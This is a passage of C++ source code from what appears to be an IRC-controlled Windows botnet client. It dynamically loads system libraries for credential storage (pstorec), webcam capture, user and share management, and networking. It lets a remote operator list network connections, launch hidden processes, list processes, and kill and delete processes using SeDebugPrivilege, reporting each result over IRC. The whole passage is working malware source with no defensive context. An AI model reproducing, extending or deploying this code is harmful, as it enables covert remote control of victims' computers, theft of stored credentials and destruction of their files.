	 	fInternetGetConnectedStateEx = (IGCSE)GetProcAddress(wininet_dll, "InternetGetConnectedStateEx");
	 	fHttpOpenRequest = (HOR)GetProcAddress(wininet_dll, "HttpOpenRequestA");
	 	fHttpSendRequest = (HSR)GetProcAddress(wininet_dll, "HttpSendRequestA");
		fFtpGetFile = (FGF)GetProcAddress(wininet_dll, "FtpGetFileA");
		fFtpPutFile = (FPF)GetProcAddress(wininet_dll, "FtpPutFileA");
	 	fInternetConnect = (IC)GetProcAddress(wininet_dll, "InternetConnectA");
	 	fInternetOpen = (IO)GetProcAddress(wininet_dll, "InternetOpenA");
	 	fInternetOpenUrl = (IOU)GetProcAddress(wininet_dll, "InternetOpenUrlA");
	 	fInternetCrackUrl = (ICU)GetProcAddress(wininet_dll, "InternetCrackUrlA");
	 	fInternetReadFile = (IRF)GetProcAddress(wininet_dll, "InternetReadFile");
	 	fInternetCloseHandle = (ICH)GetProcAddress(wininet_dll, "InternetCloseHandle");

		if (!fInternetGetConnectedState || !fInternetGetConnectedStateEx || !fHttpOpenRequest 
			|| !fHttpSendRequest || !fInternetConnect || !fInternetOpen || !fInternetOpenUrl
			|| !fInternetCrackUrl || !fInternetReadFile || !fInternetCloseHandle) 
			nowininet = TRUE;

		if (fInternetOpen) {
				ih = fInternetOpen("Mozilla/4.0 (compatible)", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
				if (ih == NULL) ih = 0;
		}
	} else {
		nowinineterr = GetLastError();
		nowininet = TRUE;
		ih = 0;
	}

#ifndef NO_PING
	// dynamically load icmp.dll
 	HMODULE icmp_dll = LoadLibrary("icmp.dll");
    if (icmp_dll) {
	 	fIcmpCreateFile = (ICF)GetProcAddress(icmp_dll,"IcmpCreateFile");
 		fIcmpCloseHandle = (ICH)GetProcAddress(icmp_dll,"IcmpCloseHandle");
 		fIcmpSendEcho = (ISE)GetProcAddress(icmp_dll,"IcmpSendEcho");

		if (!fIcmpCreateFile || !fIcmpCloseHandle || !fIcmpSendEcho)
	        noicmp = TRUE;
	} else {
		noicmperr = GetLastError();
		noicmp = TRUE;
	}
#endif // NO_PING
	
	// dynamically load netapi32.dll
 	HMODULE netapi32_dll = LoadLibrary("netapi32.dll");
    if (netapi32_dll) {
	 	fNetShareAdd = (NSA)GetProcAddress(netapi32_dll,"NetShareAdd");
	 	fNetShareDel = (NSD)GetProcAddress(netapi32_dll,"NetShareDel");
		fNetShareEnum = (NSE)GetProcAddress(netapi32_dll,"NetShareEnum");
	 	fNetScheduleJobAdd = (NSJA)GetProcAddress(netapi32_dll,"NetScheduleJobAdd");
	 	fNetApiBufferFree = (NABF)GetProcAddress(netapi32_dll,"NetApiBufferFree");
	 	fNetRemoteTOD = (NRTOD)GetProcAddress(netapi32_dll,"NetRemoteTOD");
	 	fNetUserAdd = (NUA)GetProcAddress(netapi32_dll,"NetUserAdd");
	 	fNetUserDel = (NUD)GetProcAddress(netapi32_dll,"NetUserDel");
	 	fNetUserEnum = (NUE)GetProcAddress(netapi32_dll,"NetUserEnum");
	 	fNetUserGetInfo = (NUGI)GetProcAddress(netapi32_dll,"NetUserGetInfo");
		fNetMessageBufferSend = (NMBS)GetProcAddress(netapi32_dll,"NetMessageBufferSend");
		
		if (!fNetShareAdd || !fNetShareDel || !fNetShareEnum || !fNetScheduleJobAdd 
			|| !fNetApiBufferFree || !fNetRemoteTOD || !fNetUserAdd || !fNetUserDel
			|| !fNetUserEnum || !fNetUserGetInfo || !fNetMessageBufferSend)	
	        nonetapi32 = TRUE;
	} else {
		nonetapi32err = GetLastError();
		nonetapi32 = TRUE;
	}

	// dynamically load dnsapi.dll
 	HMODULE dnsapi_dll = LoadLibrary("dnsapi.dll");
    if (dnsapi_dll) {
	 	fDnsFlushResolverCache = (DFRC)GetProcAddress(dnsapi_dll,"DnsFlushResolverCache");
	 	fDnsFlushResolverCacheEntry_A = (DFRCEA)GetProcAddress(dnsapi_dll,"DnsFlushResolverCacheEntry_A");

		if (!fDnsFlushResolverCache || !fDnsFlushResolverCacheEntry_A)
	        nodnsapi = TRUE;
	} else {
		nodnsapierr = GetLastError();
		nodnsapi = TRUE;
	}

	// dynamically load iphlpapi.dll
 	HMODULE iphlpapi_dll = LoadLibrary("iphlpapi.dll");
    if (iphlpapi_dll) {
	 	fGetIpNetTable = (GINT)GetProcAddress(iphlpapi_dll,"GetIpNetTable");
	 	fDeleteIpNetEntry = (DINE)GetProcAddress(iphlpapi_dll,"DeleteIpNetEntry");
		fGetIfTable = (GIT)GetProcAddress(iphlpapi_dll,"GetIfTable");
		fGetTcpTable = (GTT)GetProcAddress(iphlpapi_dll,"GetTcpTable");
		fGetUdpTable = (GUT)GetProcAddress(iphlpapi_dll,"GetUdpTable");

		if (!fGetIpNetTable || !fDeleteIpNetEntry || !fGetIfTable || !fGetUdpTable || !fGetTcpTable)
	        noiphlpapi = TRUE;
		
#ifndef NO_NETSTATP
		fAllocateAndGetTcpExTableFromStack = (AAGTETFS)GetProcAddress(iphlpapi_dll,"AllocateAndGetTcpExTableFromStack");
		fAllocateAndGetUdpExTableFromStack = (AAGUETFS)GetProcAddress(iphlpapi_dll,"AllocateAndGetUdpExTableFromStack");
 
		if (!fAllocateAndGetTcpExTableFromStack || !fAllocateAndGetUdpExTableFromStack)	
	        noiphlpapinsp = TRUE;
#endif // NO_NETSTATP

#ifndef NO_ENETINFO
		fGetNetworkParams = (GNP)GetProcAddress(iphlpapi_dll,"GetNetworkParams");

		if (!fGetNetworkParams)	
	        noiphlpapi = TRUE;
#endif // NO_ENETINFO

	} else {
		noiphlpapierr = GetLastError();
		noiphlpapi = TRUE;
	}

	// dynamically load mpr.dll
 	

	// dynamically load shell32.dll
 	HMODULE shell32_dll = LoadLibrary("shell32.dll");
    if (shell32_dll) {
	 	fShellExecute = (SE)GetProcAddress(shell32_dll,"ShellExecuteA");
		fSHChangeNotify = (SHCN)GetProcAddress(shell32_dll,"SHChangeNotify");
 
		if (!fShellExecute || !fSHChangeNotify)
	        noshell32 = TRUE;
	} else {
		noshell32err = GetLastError();
		noshell32 = TRUE;
	}

	// dynamically load odbc32.dll
 	HMODULE odbc32_dll = LoadLibrary("odbc32.dll");
    if (odbc32_dll) {
	 	fSQLDriverConnect = (SQLDC)GetProcAddress(odbc32_dll,"SQLDriverConnect");
	 	fSQLSetEnvAttr = (SQLSEA)GetProcAddress(odbc32_dll,"SQLSetEnvAttr");
	 	fSQLExecDirect = (SQLED)GetProcAddress(odbc32_dll,"SQLExecDirect");
	 	fSQLAllocHandle = (SQLAH)GetProcAddress(odbc32_dll,"SQLAllocHandle");
	 	fSQLFreeHandle = (SQLFH)GetProcAddress(odbc32_dll,"SQLFreeHandle");
	 	fSQLDisconnect = (SQLD)GetProcAddress(odbc32_dll,"SQLDisconnect");
 
		if (!fSQLDriverConnect || !fSQLSetEnvAttr || !fSQLExecDirect
			|| !fSQLAllocHandle || !fSQLFreeHandle || !fSQLDisconnect)
	        noodbc32 = TRUE;
	} else {
		noodbc32err = GetLastError();
		noodbc32 = TRUE;
	}

#ifndef NO_CAPTURE
	// dynamically load avicap32.dll
 	HMODULE avicap32_dll = LoadLibrary("avicap32.dll");
    if (avicap32_dll) {
	 	fcapCreateCaptureWindow = (cCCW)GetProcAddress(avicap32_dll,"capCreateCaptureWindowA");
	 	fcapGetDriverDescription = (cGDD)GetProcAddress(avicap32_dll,"capGetDriverDescriptionA");
 
		if (!fcapCreateCaptureWindow || !fcapGetDriverDescription)
	        noavicap32 = TRUE;
	} else {
		noavicap32err = GetLastError();
		noavicap32 = TRUE;
	}
#endif // NO_CAPTURE

	// dynamically load psapi.dll
 	HMODULE psapi_dll = LoadLibrary("psapi.dll");
    if (psapi_dll) {
	 	fGetModuleFileNameEx = (GMFNE)GetProcAddress(psapi_dll,"GetModuleFileNameExA");
	 	fGetModuleBaseName = (GMBN)GetProcAddress(psapi_dll,"GetModuleBaseNameA");
	 	fEnumProcessModules = (EPM)GetProcAddress(psapi_dll,"EnumProcessModules");
	 	fEnumProcesses = (EP)GetProcAddress(psapi_dll,"EnumProcesses");
	 	fGetProcessMemoryInfo = (GPMI)GetProcAddress(psapi_dll,"GetProcessMemoryInfo");

		if (!fGetModuleBaseName || !fEnumProcessModules || !fEnumProcesses || !fGetProcessMemoryInfo)
	        nopsapi = TRUE;
	} else {
		nopsapierr = GetLastError();
		nopsapi = TRUE;
	}

#ifndef NO_PSTORE
	// dynamically load pstorec.dll
 	HMODULE pstorec_dll = LoadLibrary("pstorec.dll");
    if (pstorec_dll) {
	 	fPStoreCreateInstance = (PSCI)GetProcAddress(pstorec_dll,"PStoreCreateInstance");

		if (!fPStoreCreateInstance)
	        nopstore = TRUE;
	} else {
		nopstoreerr = GetLastError();
		nopstore = TRUE;
	}
#endif


	// dynamically load shlwapi.dll
 	HMODULE shlwapi_dll = LoadLibrary("shlwapi.dll");
    if (shlwapi_dll) {
	 	fPathRemoveFileSpec = (PRFS)GetProcAddress(shlwapi_dll ,"PathRemoveFileSpecA");

		if (!fPathRemoveFileSpec)
	        noshlwapi = TRUE;
	} else {
		noshlwapierr = GetLastError();
		noshlwapi = TRUE;
	}

	return TRUE;
}

#ifndef NO_DLLTEST
void CheckDLLs(char *target,void *conn)
{
	IRC* irc=(IRC*)conn;

#ifdef _DEBUG
	printf("Advapi32.dll: fClearEventLog: %s\n",fClearEventLog?"TRUE":"FALSE");
	printf("Advapi32.dll: fOpenEventLog: %s\n", fOpenEventLog?"TRUE":"FALSE");
	printf("Advapi32.dll: fCloseEventLog: %s\n",fCloseEventLog?"TRUE":"FALSE");
#endif
	
	if (nokernel32)
		irc->privmsg(target,"Kernel32.dll failed. <%d>", nokernel32err);

	if (nouser32)
		irc->privmsg(target,"User32.dll failed. <%d>", nouser32err);

	if (noadvapi32)
		irc->privmsg(target,"Advapi32.dll failed. <%d>", noadvapi32err);

	if (noadvapi32lsa)
		irc->privmsg(target,"Parts of Advapi32.dll failed. (Lsa Restrict)");

	if (nogdi32)
		irc->privmsg(target,"Gdi32.dll failed. <%d>", nogdi32err);

	if (nows2_32)
		irc->privmsg(target,"Ws2_32.dll failed. <%d>", nows2_32err);

	if (nowininet)
		irc->privmsg(target,"Wininet.dll failed. <%d>", nowinineterr);

	if (noicmp)
		irc->privmsg(target,"Icmp.dll failed. <%d>", noicmperr);

	if (nonetapi32)
		irc->privmsg(target,"Netapi32.dll failed. <%d>", nonetapi32err);

	if (nodnsapi)
		irc->privmsg(target,"Dnsapi.dll failed. <%d>", nodnsapierr);

	if (noiphlpapi)
		irc->privmsg(target,"Iphlpapi.dll failed. <%d>", noiphlpapierr);

	if (noiphlpapinsp)
		irc->privmsg(target,"Parts of Iphlpapi.dll failed. (Netstatp)");

	if (nompr)
		irc->privmsg(target,"Mpr32.dll failed. <%d>", nomprerr);

	if (noshell32)
		irc->privmsg(target,"Shell32.dll failed. <%d>", noshell32err);

	if (noodbc32)
		irc->privmsg(target,"Odbc32.dll failed. <%d>", noodbc32err);

	#ifndef NO_CAPTURE
	if (noavicap32)
		irc->privmsg(target,"Avicap32.dll failed. <%d>", noavicap32err);
	#endif
	if (nopsapi)
		irc->privmsg(target,"Psapi.dll failed. <%d>", nopsapierr);

#ifndef NO_PSTORE
	if (nopstore)
		irc->privmsg(target,"PStore.dll failed. <%d>", nopstoreerr);
#endif

	if (noshlwapi)
		irc->privmsg(target,"Shlwapi.dll failed. <%d>", noshlwapierr);

	irc->privmsg(target,"%s DLL test complete.",main_title);
	
	return;
}
#endif // NO_DLLTEST



#ifndef NO_NETSTATP


// Possible TCP endpoint states
static char TcpState[][32] = {"???","CLOSED","LISTENING","SYN_SENT","SYN_RCVD","ESTABLISHED","FIN_WAIT1","FIN_WAIT2","CLOSE_WAIT","CLOSING","LAST_ACK","TIME_WAIT","DELETE_TCB"};

//------------------------------------------------------------
// GetPortName
//
// Translate port numbers into their text equivalent if 
// there is one
//------------------------------------------------------------
PCHAR GetPortName(DWORD Flags,UINT port,PCHAR proto,PCHAR name,int namelen) {
	struct servent *psrvent;

	if(Flags & FLAG_SHOW_NUMBERS) {
		sprintf(name, "%d", fhtons((WORD)port));
		return name;
	} 

	// Try to translate to a name
	if(psrvent = fgetservbyport(port,proto)) {
		strcpy(name,psrvent->s_name);
	} else {
		sprintf(name,"%d",fhtons((WORD)port));
	}

	return name;
}

//------------------------------------------------------------
// GetIpHostName
//
// Translate IP addresses into their name-resolved form
// if possible.
//------------------------------------------------------------
PCHAR GetIpHostName(DWORD Flags,BOOL local,UINT ipaddr,PCHAR name,int namelen) {
	struct hostent	*phostent;
	UINT			nipaddr;

	// Does the user want raw numbers?
	nipaddr = fhtonl(ipaddr);
	if(Flags & FLAG_SHOW_NUMBERS) {
		sprintf(name, "%d.%d.%d.%d",(nipaddr >> 24) & 0xFF,(nipaddr >> 16) & 0xFF,(nipaddr >> 8) & 0xFF,(nipaddr) & 0xFF);
		return name;
	}

	// Try to translate to a name
	if(!ipaddr) {
		if(!local) {
			sprintf(name,"%d.%d.%d.%d",(nipaddr >> 24) & 0xFF,(nipaddr >> 16) & 0xFF,(nipaddr >> 8) & 0xFF,(nipaddr) & 0xFF);
		} else {
			fgethostname(name, namelen);
		}
	} else if( ipaddr == 0x0100007f ) {
		if(local) {
			fgethostname(name, namelen);
		} else {
			strcpy(name,"localhost");
		}
	} else if(phostent = fgethostbyaddr((char *)&ipaddr,sizeof(nipaddr),PF_INET)) {
		strcpy(name, phostent->h_name);
	} else {
		sprintf(name,"%d.%d.%d.%d",(nipaddr >> 24) & 0xFF,(nipaddr >> 16) & 0xFF,(nipaddr >> 8) & 0xFF,(nipaddr) & 0xFF);
	}

	return name;
}

DWORD WINAPI NetstatpThread(LPVOID param) 
{
//	int entries = LOGSIZE, tmp = 0;

	NTHREAD netstat = *((NTHREAD *)param);
	NTHREAD *netstatp = (NTHREAD *)param;
	netstatp->gotinfo = TRUE;
	IRC* irc=(IRC*)netstat.conn;

	if (!nokernel32) {
		if (!noiphlpapi) {
			
			DWORD error,dwSize;
			PMIB_TCPEXTABLE tcpExTable;
			PMIB_UDPEXTABLE udpExTable;
			PMIB_TCPTABLE tcpTable;
			PMIB_UDPTABLE udpTable;
			DWORD i, flags;
			CHAR  processName[MAX_PATH];
			CHAR  localname[HOSTNAMELEN], remotename[HOSTNAMELEN];
			CHAR  remoteport[PORTNAMELEN], localport[PORTNAMELEN];
			CHAR  localaddr[ADDRESSLEN], remoteaddr[ADDRESSLEN];

			if (netstat.bdata1)//all
				flags |= FLAG_ALL_ENDPOINTS;

			if (netstat.bdata2)//dont resolve
				flags |= FLAG_SHOW_NUMBERS;

			// Check for NT
			if(GetVersion() >= 0x80000000) {
				irc->privmsg(netstat.target,"%s Netstatp requres Windows NT/2K/XP.",netstatp_title);
				clearthread(netstat.threadnum);
				ExitThread(0);
			}

			if (!noiphlpapinsp) // xp+
			{

				// Get the tables of TCP and UDP endpoints with process IDs
				error=fAllocateAndGetTcpExTableFromStack(&tcpExTable,TRUE,GetProcessHeap(),2,2);
				if(error) {
					irc->privmsg(netstat.target,"%s Failed to snapshot TCP endpoints, error: <%d>.", GetLastError());
					clearthread(netstat.threadnum);
					ExitThread(0);
				}
				error=fAllocateAndGetUdpExTableFromStack(&udpExTable,TRUE,GetProcessHeap(),2,2);
				if(error) {
					irc->privmsg(netstat.target,"%s Failed to snapshot UDP endpoints, error: <%d>.", GetLastError());
					clearthread(netstat.threadnum);
					ExitThread(0);
				}

				if (!netstat.bdata3)
					irc->privmsg(netstat.target,"%s Displaying %sconnections:%s", netstatp_title,(netstat.bdata1?"all ":""),(netstat.bdata2?" (Not Resolving)":""));
				
				// Dump the TCP table
				for (i=0; i<tcpExTable->dwNumEntries; i++ ) {
					if(flags & FLAG_ALL_ENDPOINTS || tcpExTable->table[i].dwState == MIB_TCP_STATE_ESTAB) {

						if (netstat.idata1 == 0 || netstat.idata1 == atoi(GetPortName(FLAG_SHOW_NUMBERS,tcpExTable->table[i].dwRemotePort,"tcp",remoteport,PORTNAMELEN))) {
							sprintf(localaddr,"%s:%s", 
								GetIpHostName(flags,TRUE,tcpExTable->table[i].dwLocalAddr,localname,HOSTNAMELEN), 
								GetPortName(flags,tcpExTable->table[i].dwLocalPort,"tcp",localport,PORTNAMELEN));

							sprintf(remoteaddr,"%s:%s",
								GetIpHostName(flags,FALSE,tcpExTable->table[i].dwRemoteAddr,remotename,HOSTNAMELEN),
									tcpExTable->table[i].dwRemoteAddr?
									GetPortName(flags,tcpExTable->table[i].dwRemotePort,"tcp",remoteport,PORTNAMELEN):
									"0");

							irc->privmsg(netstat.target,"%s %-11s - %s:%d - Local: %s - Remote: %s.",
								tcp_title, TcpState[tcpExTable->table[i].dwState],
								ProcessPidToName(tcpExTable->table[i].dwProcessId,processName),
								tcpExTable->table[i].dwProcessId,
								localaddr,remoteaddr);
						}
					}
				}

				// Dump the UDP table
				if (flags & FLAG_ALL_ENDPOINTS) {
					for (i=0; i<udpExTable->dwNumEntries; i++) {

						sprintf(localaddr,"%s:%s", 
							GetIpHostName(flags,TRUE,udpExTable->table[i].dwLocalAddr,localname,HOSTNAMELEN), 
							GetPortName(flags,udpExTable->table[i].dwLocalPort,"tcp",localport,PORTNAMELEN));

						irc->privmsg(netstat.target,"%s %s:%d - Local: %s - Remote: %s",udp_title, 
							ProcessPidToName(udpExTable->table[i].dwProcessId,processName),udpExTable->table[i].dwProcessId,
							localaddr,"*.*.*.*:*");
					}
				}
				
				if (!netstat.bdata3)
					irc->privmsg(netstat.target,"%s Finished displaying connections.", netstatp_title);
			
			}
			else//if noiphlpapinsp
			{	//nt-2k?

				// Get the table of TCP endpoints
				dwSize = 0;
				error=fGetTcpTable(NULL,&dwSize,TRUE);
				if (error != ERROR_INSUFFICIENT_BUFFER) {
					irc->privmsg(netstat.target,"%s Failed to snapshot TCP endpoints, error: <%d>",error);
					clearthread(netstat.threadnum);
					ExitThread(0);
				}
				tcpTable = (PMIB_TCPTABLE)malloc(dwSize);
				error=fGetTcpTable(tcpTable,&dwSize,TRUE);
				if (error) {
					irc->privmsg(netstat.target,"%s Failed to snapshot TCP endpoints, error: <%d>",error);
					clearthread(netstat.threadnum);
					ExitThread(0);
				}

				// Get the table of UDP endpoints
				dwSize=0;
				error=fGetUdpTable(NULL,&dwSize,TRUE);
				if (error != ERROR_INSUFFICIENT_BUFFER) {
					irc->privmsg(netstat.target,"%s Failed to snapshot UDP endpoints, error: <%d>",error);
					clearthread(netstat.threadnum);
					ExitThread(0);
				}
				udpTable=(PMIB_UDPTABLE)malloc(dwSize);
				error=fGetUdpTable(udpTable,&dwSize,TRUE);
				if (error) {
					irc->privmsg(netstat.target,"%s Failed to snapshot UDP endpoints, error: <%d>",error);
					clearthread(netstat.threadnum);
					ExitThread(0);
				}

				if (!netstat.bdata3)
					irc->privmsg(netstat.target,"%s Displaying %sconnections:%s", netstatp_title,(netstat.bdata1?"all ":""),(netstat.bdata2?" (Not Resolving)":""));
				
				// Dump the TCP table
				for (i=0; i<tcpTable->dwNumEntries; i++ ) {
					if(flags & FLAG_ALL_ENDPOINTS || tcpTable->table[i].dwState==MIB_TCP_STATE_ESTAB) {

						if (netstat.idata1 == 0 || netstat.idata1 == atoi(GetPortName(FLAG_SHOW_NUMBERS,tcpTable->table[i].dwRemotePort,"tcp",remoteport,PORTNAMELEN))) {
							sprintf(localaddr,"%s:%s", 
								GetIpHostName(flags,TRUE,tcpTable->table[i].dwLocalAddr,localname,HOSTNAMELEN), 
								GetPortName(flags,tcpTable->table[i].dwLocalPort,"tcp",localport,PORTNAMELEN));

							sprintf(remoteaddr,"%s:%s",
								GetIpHostName(flags,FALSE,tcpTable->table[i].dwRemoteAddr,remotename,HOSTNAMELEN),
								tcpTable->table[i].dwRemoteAddr?GetPortName(flags,tcpTable->table[i].dwRemotePort,"tcp",remoteport,PORTNAMELEN):"0");

							irc->privmsg(netstat.target,"%s %-11s - Local: %s - Remote: %s.",
								tcp_title, TcpState[tcpTable->table[i].dwState],
								localaddr,remoteaddr);
						}
					}
				}

				// Dump the UDP table
				if (flags & FLAG_ALL_ENDPOINTS) {
					for (i=0; i<udpTable->dwNumEntries; i++) {

						sprintf(localaddr,"%s:%s", 
							GetIpHostName(flags,TRUE,udpTable->table[i].dwLocalAddr,localname,HOSTNAMELEN), 
							GetPortName(flags,udpTable->table[i].dwLocalPort,"tcp",localport,PORTNAMELEN));

						irc->privmsg(netstat.target,"%s Local: %s - Remote: %s",
							udp_title, localaddr,"*.*.*.*:*");
					}
				}
				
				if (!netstat.bdata3)
					irc->privmsg(netstat.target,"%s Finished displaying connections.", netstatp_title);
			}
		}
	}
	clearthread(netstat.threadnum);
	ExitThread(0);
}

#endif


#ifndef NO_PROCESS

DWORD WINAPI CreateProcThread(LPVOID param)
{
	NTHREAD process = *((NTHREAD *)param);
	NTHREAD *processt = (NTHREAD *)param;
	processt->gotinfo = TRUE;
	IRC* irc=(IRC*)process.conn;

	STARTUPINFO si;
	PROCESS_INFORMATION pi;

	BOOL hide=process.bdata1;
	BOOL wait=process.bdata2;
	char file[MAX_PATH];
	strcpy(file,process.data1);

	char path[MAX_PATH];
	strncpy(path,file,sizeof(path));
	if (!fPathRemoveFileSpec(path))
	{
		if (!process.silent)
			irc->privmsg(process.target,"%s Couldn't parse path, error: <%d>", process_title, GetLastError());
		return 1;
	}
	
	ZeroMemory(&si,sizeof(si));
	ZeroMemory(&pi,sizeof(pi));
	si.cb=sizeof(si);
	si.dwFlags = STARTF_USESHOWWINDOW;
	si.wShowWindow = (hide?SW_HIDE:SW_SHOW);

	if (!CreateProcess(NULL,file,NULL,NULL,FALSE,0,NULL,path,&si,&pi))
	{
		if (!process.silent)
			irc->privmsg(process.target,"%s Failed to create process: \"%s\", error: <%d>", process_title, file, GetLastError());
		return 1;
	}
	else
	{
		DWORD start=GetTickCount();//record this before the privmsg so we arent off
		if (!process.silent)
			irc->privmsg(process.target,"%s Created process: \"%s\", PID: <%d>",process_title,file,pi.dwProcessId);
		
		if (!process.silent)
		{//no sense waiting if its silent
			if (wait)
			{
				WaitForSingleObject(pi.hProcess,INFINITE);
				DWORD stop=GetTickCount();
				char ttime[120],stime[120];
				stime[0]='\0';
				DWORD total = ((stop - start)/1000);
				DWORD hours = (total%86400)/3600;
				DWORD minutes = ((total%86400)%3600)/60;
				DWORD seconds = ((total%86400)%3600)%60;
				if (hours>0)
				{
					sprintf(ttime," %d%s",hours,(hours==1?" hour":" hours"));
					strcat(stime,ttime);
				}
				sprintf(ttime," %.2d:%.2d",minutes,seconds);
				strcat(stime,ttime);

				irc->privmsg(process.target,"%s Process Finished: \"%s\", Total Running Time: %s.", process_title,file,stime);
			}
		}
		if (pi.hProcess) CloseHandle(pi.hProcess);
		if (pi.hThread) CloseHandle(pi.hThread);
	}
	clearthread(process.threadnum);
	return 0;
}

// data1  = process to kill
// data2  = process to filter (for list)

// bdata1 = list
// bdata2 = kill
// bdata3 = del on kill
DWORD WINAPI ProcessThread(LPVOID param) 
{
	NTHREAD process = *((NTHREAD *)param);
	NTHREAD *processt = (NTHREAD *)param;
	processt->gotinfo = TRUE;

	IRC* irc=(IRC*)process.conn;
	char sendbuf[IRCLINE];
	//char target[128];
	//sprintf(target,process.hostd->target);
	//char *target=process.hostd->target;

	if (process.bdata1) // list
	{
		std::list<process_info> lProcesses;
		if(ListProcesses(&lProcesses,process.data2))
		{
			std::list<process_info>::iterator ip; int iCount=0;

			irc->privmsg(process.target,"%s Process List:",process_title);

			if (process.verbose)
				irc->privmsg(process.target," PID  - Mem Usage - Process");

			for(ip=lProcesses.begin(); ip!=lProcesses.end(); ++ip)
			{
				iCount++;
				char *processExe=(*ip).sProcessName;
				char *mUsage=(*ip).mUsage;
				unsigned long processPid=(*ip).lProcessPid;

				strcat(mUsage," K");
				sprintf(sendbuf," %-6d- %-10s- \"%s\"",processPid,mUsage,processExe);

				irc->privmsg(process.target,sendbuf);
			}
			//sprintf(sendbuf,"%s Displayed process list.",process_title);
			//addlog(MAINLOG,sendbuf);
			irc->privmsg(process.target,"%s End of list.",process_title);
		}
		else
		{
			irc->privmsg(process.target,"%s Unable to list processes, error: <%d>.",process_title,GetLastError());
			//addlog(ERRORLOG,sendbuf);
		}

	}
	else
	{
		if (process.bdata2) // kill
		{
			char procKilled[16];

			if (!process.bdata3) // delete
			{
				if (KillProcess(process.data1,procKilled))
				{
					if (!process.silent)
						irc->privmsg(process.target,"%s Process \"%s\" killed, total: <%s>.",process_title,process.data1,procKilled);
				}
				else if (KillPid(atoi(process.data1)))
				{
					if (!process.silent)
						irc->privmsg(process.target,"%s PID \"%i\" killed.",process_title,atoi(process.data1));
				}
				else
				{
					if (!process.silent)
						irc->privmsg(process.target,"%s Failed to kill process.",process_title);
				}
			}
			else
			{
				char path[MAX_PATH];
				sprintf(path,"%s",ProcessPidToName(atoi(process.data1),path));

				char fname[_MAX_FNAME],ext[_MAX_EXT];
				_splitpath(path,0,0,fname,ext);
				strcat(fname,ext);
				
				BOOL success=FALSE;
				BOOL killed=FALSE;
				for (int t=0;t<5;t++)
				{
					if (KillPid(atoi(process.data1)))
						killed=TRUE;
					SetFileAttributes(path,FILE_ATTRIBUTE_NORMAL);
					if (DeleteFile(path))
					{
						success=TRUE;
						break;
					}
					else
					{
						if (killed) //if we've killed the process id and cant erase 
							KillProcess(fname,0);//it maybe its running more than once
						Sleep(1000);
					}
				}
				if (success)
				{
					if (!process.silent)
						irc->privmsg(process.target,"%s PID \"%i\" killed and deleted.",process_title,atoi(process.data1));
				}
				else
				{
					if (!process.silent)
						irc->privmsg(process.target,"%s Failed to kill and erase process.",process_title);
				}
			}
		}
	}
	clearthread(process.threadnum);
	return 0;
}

bool ListProcesses(std::list<process_info> *lProcesses, char *filter) {

	DWORD aProcesses[1024], cbNeeded, cProcesses;
	if (!fEnumProcesses(aProcesses,sizeof(aProcesses),&cbNeeded))
		return FALSE;
	cProcesses = cbNeeded / sizeof(DWORD);
	char szProcessName[MAX_PATH] = "unknown";

	for ( int i = 0; i < cProcesses; i++ ) {
	  HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION|PROCESS_VM_READ,FALSE,aProcesses[i]);
		if (hProcess) {
			HMODULE hMod;
			PROCESS_MEMORY_COUNTERS pmc;
			DWORD cbNeeded;
			//char tempbuf[128];

			if (fEnumProcessModules(hProcess,&hMod,sizeof(hMod),&cbNeeded)) {
				
				fGetModuleFileNameEx(hProcess,hMod,szProcessName,sizeof(szProcessName));

				process_info pInfo;
				sprintf(pInfo.sProcessName,"%s",szProcessName);
				pInfo.lProcessPid=aProcesses[i];

				if (fGetProcessMemoryInfo(hProcess,&pmc,sizeof(pmc))) {
					_snprintf(pInfo.mUsage,sizeof(pInfo.mUsage),"%s",commaI64((pmc.WorkingSetSize/1024)));
				} else
					_snprintf(pInfo.mUsage,sizeof(pInfo.mUsage),"Error: <%d>",GetLastError());

				if (filter)
				{
					char ext[_MAX_EXT],file[_MAX_FNAME+_MAX_EXT];
					_splitpath(pInfo.sProcessName, NULL, NULL, file, ext);
					strcat(file,ext);
					fprintf(stderr,"%s / %s\n",filter,file);
					if (!lstrcmpi(filter,file))
					{
						lProcesses->push_back(pInfo);
					}
				}
				else
					lProcesses->push_back(pInfo);
			}
			CloseHandle(hProcess);
		}
	}
	return TRUE;
}

bool KillProcess(const char *szProcName, char *procKilled) {
	DWORD aProcesses[1024], cbNeeded, cProcesses;
	bool bRetVal=false;
	unsigned int i;
	HMODULE hMod;

	// Get SeDebugPrivileges
	TOKEN_PRIVILEGES tPriv, tPrivOld;
	DWORD cbPriv=sizeof(tPrivOld);
	HANDLE hToken;
	
	if(!fOpenThreadToken(GetCurrentThread(), TOKEN_QUERY|TOKEN_ADJUST_PRIVILEGES, FALSE, &hToken))
		if(!fOpenProcessToken(GetCurrentProcess(), TOKEN_QUERY|TOKEN_ADJUST_PRIVILEGES, &hToken))
			hToken=NULL;

	if(hToken) {
		tPriv.PrivilegeCount=1; tPriv.Privileges[0].Attributes=SE_PRIVILEGE_ENABLED;
		fLookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tPriv.Privileges[0].Luid);
		if(fAdjustTokenPrivileges(hToken, FALSE, &tPriv, sizeof(tPriv), &tPrivOld, &cbPriv)) {
			if(GetLastError()==ERROR_NOT_ALL_ASSIGNED) {
				CloseHandle(hToken); hToken=NULL;
			}
		} else {
			CloseHandle(hToken);
			hToken=NULL;
		}
	}

	// Enumerate processes
	if(!fEnumProcesses(aProcesses, sizeof(aProcesses), &cbNeeded))
		return false;
	cProcesses=cbNeeded/sizeof(DWORD);

	unsigned int killed=0;
	for(i=0; i<cProcesses; i++) {
		char szProcessName[MAX_PATH];
		strcpy(szProcessName, "unknown");
		HANDLE hProcess=OpenProcess(PROCESS_QUERY_INFORMATION|PROCESS_VM_READ|PROCESS_TERMINATE,FALSE,aProcesses[i]);
		if(hProcess) {
			if(fEnumProcessModules(hProcess, &hMod, sizeof(hMod), &cbNeeded)) {
				fGetModuleBaseName(hProcess, hMod, szProcessName, sizeof(szProcessName));
				for(int ipn=0;ipn<strlen(szProcessName);ipn++)
					*(szProcessName+i)=toupper(*(szProcessName+i));
				
				if(!szProcName) {
					bRetVal=false; // FIX ME: Could Kill all bot processes here
				}
				else { // Kill the named process
					if(!strcmp(szProcessName, szProcName)) {
						killed++;
						TerminateProcess(hProcess, 0);
						bRetVal=true;
					}
				}
			}
			CloseHandle(hProcess);
		}
	}

	if (procKilled)
		sprintf(procKilled,"%i",killed);
	
	// Drop SeDebugPrivileges
	if(hToken) {
		fAdjustTokenPrivileges(hToken, FALSE, &tPrivOld, sizeof(tPrivOld), NULL, NULL);
